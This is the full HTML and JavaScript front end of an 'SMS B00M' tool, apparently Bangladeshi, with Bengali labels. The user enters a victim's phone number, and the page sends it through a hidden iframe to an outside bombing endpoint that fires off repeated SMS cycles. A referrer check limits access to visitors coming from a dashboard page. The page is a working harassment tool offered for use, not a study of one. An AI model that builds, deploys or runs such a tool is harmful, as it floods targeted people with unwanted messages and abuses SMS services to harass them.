<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS B00M</title>
  <style>
    /* পূর্বের স্টাইল কোড (Style Code) */
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      background: radial-gradient(circle at top, #00111a 0%, #000000 100%);
      font-family: "Poppins", sans-serif;
      color: #00eaff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .boom-container {
      margin-top: -50px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 90%;
      max-width: 400px;
      padding: 40px 20px;
      border-radius: 15px;
      background: #001820;
      box-shadow: 0 0 25px #00eaff88;
    }
    h1 {
      font-size: 24px;
      font-weight: bold;
      text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff;
      margin-bottom: 5px;
    }
    input[type="number"] {
      padding: 15px;
      border-radius: 8px;
      border: 2px solid #00eaff;
      background: #000a10;
      color: #00eaff;
      font-size: 18px;
      text-align: center;
      box-shadow: 0 0 10px #00eaff88;
      outline: none;
      transition: border-color 0.3s;
    }
    input[type="number"]:focus {
      border-color: #00ffff;
    }
    .btn {
      padding: 15px;
      border-radius: 12px;
      background: #002a33;
      color: #00eaff;
      font-size: 20px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      text-shadow: 0 0 10px #00eaff;
      box-shadow: 0 0 20px #00eaffaa;
      transition: 0.3s;
    }
    .btn:hover {
      transform: scale(1.03);
      background: #004455;
    }
    .dashboard-link-btn {
        padding: 15px;
        border-radius: 12px;
        background: #330044;
        color: #ff00ff;
        font-size: 18px;
        font-weight: bold;
        border: none;
        cursor: pointer;
        text-shadow: 0 0 8px #ff00ff;
        box-shadow: 0 0 15px #ff00ff88;
        text-decoration: none;
        display: block;
        text-align: center;
        transition: 0.3s;
    }
    .dashboard-link-btn:hover {
        transform: scale(1.03);
        background: #550066;
    }
    #status {
      margin-top: 5px;
      font-size: 16px;
      min-height: 20px;
      color: #00ffaa;
      text-shadow: 0 0 8px #00ffaa;
    }
  </style>

  <script>
    (function() {
      // চেকবক্স ১: ড্যাশবোর্ড থেকে রেফার করা হয়েছে কিনা? 
      // যদি রেফারার URL-এ 'special_dashboard.html' বা 'dashboard.html' না থাকে...
      const referrer = document.referrer;
      
      // আপনার ড্যাশবোর্ডের URL-এর অংশ (যদি এটি 'dashboard.html' হয়)
      const allowedReferrer = 'dashboard.html'; 
      const allowedReferrer2 = 'special_dashboard.html'; // যদি আপনার আসল ড্যাশবোর্ড এটি হয়

      if (!referrer.includes(allowedReferrer) && !referrer.includes(allowedReferrer2)) {
          // যদি ড্যাশবোর্ড থেকে না আসে, তবে index.html-এ রিডাইরেক্ট করে দেবে
          window.location.replace('index.html');
      }
    })();
  </script>
</head>
<body>

  <div class="boom-container">
    
    <h1>আপনার কলিজার নম্বর দেন</h1>
    
    <input 
      type="number" 
      id="targetNumber" 
      placeholder="017********" 
      pattern="[0-9]*" 
      inputmode="numeric" 
      maxlength="11"
      required
    />
    
    <button class="btn" onclick="triggerSMSBoom()">গুতা দেন</button>

    <div id="status"></div>

    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a> 
  </div>

  <script>
    // API কল করার ফাংশন (পূর্বের মতোই আছে)
    function triggerSMSBoom() {
        const numberInput = document.getElementById('targetNumber');
        const statusDiv = document.getElementById('status');
        const number = numberInput.value.trim();
        
        if (!number || number.length < 10) {
            statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
            statusDiv.style.color = '#ff0055'; 
            statusDiv.style.textShadow = '0 0 8px #ff0055';
            return;
        }

        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
        
        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে...';
        statusDiv.style.color = '#00eaff';
        statusDiv.style.textShadow = '0 0 8px #00eaff';

        // Invisible Iframe পদ্ধতি ব্যবহার করে API কল
        const oldIframe = document.getElementById('api-iframe');
        if (oldIframe) {
            oldIframe.remove();
        }

        const iframe = document.createElement('iframe');
        iframe.id = 'api-iframe';
        iframe.style.display = 'none';
        iframe.src = apiUrl;
        
        iframe.onload = function() {
            statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
            statusDiv.style.color = '#00ffaa'; 
            statusDiv.style.textShadow = '0 0 8px #00ffaa';

            setTimeout(() => {
                iframe.remove();
            }, 1000);
        };

        iframe.onerror = function() {
            statusDiv.textContent = 'সতর্কতা: সংযোগে সমস্যা হতে পারে। কলটি শুরু করার চেষ্টা করা হয়েছে।';
            statusDiv.style.color = '#ffcc00';
            statusDiv.style.textShadow = '0 0 8px #ffcc00';
            setTimeout(() => {
                iframe.remove();
            }, 1000);
        };

        document.body.appendChild(iframe);
    }
  </script>
</body>
</html>
